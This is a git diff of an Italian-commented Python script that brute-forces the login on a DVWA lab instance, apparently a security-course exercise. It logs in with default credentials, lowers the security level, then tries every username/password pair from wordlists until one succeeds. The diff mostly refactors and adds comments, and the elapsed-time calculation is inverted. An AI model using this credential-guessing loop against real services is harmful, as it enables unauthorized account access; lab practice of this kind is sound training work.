@@ -2,28 +2,23 @@ import requests
 import time
 import os
 
+# Lettura file
 username_file = open("file/usernames.txt")
 password_file = open("file/passwords.txt")
 
 user_list = username_file.readlines()
 pwd_list = password_file.readlines()
 
-# Dati di configurazione
-start_data = {
-    'dvwa_url' : 'http://192.168.50.101/dvwa',  # URL di base di DVWA
-    'username' : 'admin',  # Username per il login
-    'password' : 'password'  # Password per il login
-}
+dvwa_url = 'http://192.168.50.101/dvwa'  # URL di base di DVWA
 
-# Dato relativo al livello di sicurezza
-desired_level = 'low'  # Può essere 'low', 'medium', 'high', o 'impossible'
+desired_level = 'low'  # # Dato relativo al livello di sicurezza. Può essere 'low', 'medium', 'high'
 
 # Funzione per effettuare il login
 def login(session):
-    login_url = f'{start_data['dvwa_url']}/login.php'
+    login_url = f'{dvwa_url}/login.php'
     login_data = {
-        'username': start_data['username'],
-        'password': start_data['password'],
+        'username': 'admin',
+        'password': 'password',
         'Login': 'Login'
     }
     response = session.post(login_url, data=login_data)
@@ -31,7 +26,7 @@ def login(session):
 
 # Funzione per modificare il livello di sicurezza
 def set_security_level(session, level):
-    security_url = f'{start_data['dvwa_url']}/security.php'
+    security_url = f'{dvwa_url}/security.php'
     security_data = {
         'security': level,
         'seclev_submit': 'Submit'
@@ -47,46 +42,55 @@ def brute_force(sessione):
     'Login' : 'Login'
     }
 
-    n_attempt = 0
-    stopit = False
+    n_attempt = 0   # Variabilie per tenere traccia dei tentativi
+    stopit = False  # Variabile per controllare quando uscire dal ciclo
+    
+    # Cicli lettura user e password
     for user in user_list:
         user =  user.rstrip()
         if stopit: break
         for pwd in pwd_list:
             pwd = pwd.rstrip()
+            
+            # setting dati
             dati["username"] = user
             dati["password"] = pwd
-            new_url = f'http://192.168.50.101/dvwa/vulnerabilities/brute/?username={dati["username"]}&password={dati["password"]}&Login={dati['Login']}#'  
+            new_url = f'{dvwa_url}/vulnerabilities/brute/?username={dati["username"]}&password={dati["password"]}&Login={dati['Login']}#' 
+            
+            # Incremento e stampa numero tentativi
             n_attempt+=1
             print(f"Combinazione N: {n_attempt}")
-            response = sessione.get(new_url)
+            
+            response = sessione.post(new_url, dati) # # Post
+         
             if response.status_code == 200:
-                if "Welcome to the password protected area admin" in response.text:
+                if "Username and/or password incorrect." not in response.text:    # Controllo risposta
                     os.system("clear")
-                    print(f"Login effettuato\nUser: {user} - Password: {pwd}")
-                    end_time = time.time()
+                    print(f"Login effettuato\nUser: {user} - Password: {pwd}")    # Stampa credenziali
+                    
+                    end_time = time.time()                                        # FIne cronometro
                     executio_time = round(start_time - end_time,2)
-                    print(f"Numero tentativi: {n_attempt}")
-                    print(f"Tempo di esecuzione: {executio_time} secondi")
-                    stopit = True 
+                    
+                    print(f"Numero tentativi: {n_attempt}")                            # Stampa tentativi
+                    print(f"Tempo di esecuzione: {round(executio_time / 60)} minuti")  # Stampa esecuzione
+                    
+                    stopit = True   # Impostazione per fermare il ciclo 
                     break
             else:
                 print(f"Errore nel accedere alla pagina brute. Codice di stato: {response.status_code}")
 
-start_time = time.time()
+start_time = time.time()    # Inizio cronometro
 
-# Inizializza una sessione
-with requests.Session() as session:
-    # Effettua il login
-    if login(session):
-        print("Login effettuato con successo.")
-        
-        # Imposta il livello di sicurezza
-        if set_security_level(session, desired_level):
-            print(f"Livello di sicurezza impostato a: {desired_level}")
-        else:
-            print("Errore nell'impostare il livello di sicurezza.")
+session = requests.Session()    # Inizializza una sessione
+
+if login(session):  # Effettua il login
+    print("Login effettuato con successo.")
+    
+    if set_security_level(session, desired_level): # Imposta il livello di sicurezza e controllo sull'esecuzione
+        print(f"Livello di sicurezza impostato a: {desired_level}")
     else:
-        print("Errore nel login.")
-    print(brute_force(session))
-
+        print("Errore nell'impostare il livello di sicurezza.")
+else:
+    print("Errore nel login.")
+        
+brute_force(session) # Chiamata funzione brute force
